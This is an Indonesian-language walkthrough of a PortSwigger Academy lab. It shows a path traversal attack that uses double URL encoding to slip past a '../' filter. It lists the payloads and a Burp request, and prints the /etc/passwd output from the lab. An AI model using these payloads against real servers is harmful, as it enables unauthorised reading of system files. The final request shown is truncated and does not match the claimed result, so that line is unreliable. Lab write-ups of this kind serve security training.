# [PortSwigger Academy] Path Traversal - Lab #4

## 📌 Detail Lab
* **Nama Tantangan:** File path traversal, traversal sequences stripped with superfluous URL-decode
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** Path Traversal (Directory Traversal)
* **Tujuan Lab:** Membaca isi file `/etc/passwd` dengan melakukan bypass pada filter input menggunakan teknik *Double URL Encoding* (Superfluous URL-decode).

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Aplikasi memuat aset gambar via parameter `filename` pada endpoint `/image`. Jika kita memasukkan `../` atau URL-encode standar (`%2e%2e%2f`), filter keamanan pertama pada aplikasi akan langsung mendeteksi dan menghapus/memblokirnya.

Namun, arsitektur backend aplikasi ini mengalami masalah **Double URL Decoding**. Server menerima input, melakukan *decode* pertama (WAF/Proxy), lolos dari filter karena polanya tidak terbaca sebagai ancaman, kemudian komponen internal server melakukan *decode* kedua kalinya sebelum input diteruskan ke fungsi sistem pembaca file. 

Dengan menyandikan karakter titik (`.`) dan garis miring (`/`) sebanyak dua kali, kita bisa menyembunyikan payload dari filter pertama.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### A. Konstruksi Payload (Double URL Encoding)
Mari kita bedah proses enkripsi ganda untuk karakter navigasi traversal:

1. **Karakter Asli:** `.` dan `/`
2. **URL Encode Lapis 1:** * `.` menjadi `%2e`
   * `/` menjadi `%2f`
3. **URL Encode Lapis 2 (Mengodekan karakter `%` atau `%25`):**
   * `%2e` menjadi `%252e`
   * `%2f` menjadi `%252f`

Maka, pola `../` jika diubah ke dalam bentuk *Double URL Encode* menjadi: **`%252e%252e%252f`**

### B. Pengiriman Payload via Burp Repeater
Tangkap request pemuatan gambar dengan Burp Suite, lalu ganti nilai parameter `filename` menggunakan sekuens yang sudah di-encode dua kali:

bisa menggunakan ini
* **Payload:** `%252e%252e%252f`
* **Payload:** `..%252f..%252f..%252`

Request HTTP final di Burp Repeater:
```http
GET /image?filename=..%252f..%252f..%252 HTTP/2
Host: 0af4007204d892cc8220330800a20079.web-security-academy.net
```

### Alur Eksekusi di Backend dan Respon
Input Masuk: %252e%252e%252f...

    URL Decode Lapis 1 (Filter): Mengubah %25 menjadi %. Input menjadi %2e%2e%2f.... Filter memeriksa teks ini, tidak menemukan string ../ murni, sehingga request LOLOS.

    URL Decode Lapis 2 (Fungsi Aplikasi): Mengubah %2e%2e%2f menjadi ../.

    Eksekusi Akhir: Aplikasi mengeksekusi perintah asli ../../../etc/passwd.

Aplikasi merespons dengan status HTTP 200 OK dan menampilkan isi berkas /etc/passwd:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/
```
Hasil Akhir: Eksploitasi menggunakan kelemahan multi-layer decoding berhasil menembus proteksi server. Lab dinyatakan selesai (Solved).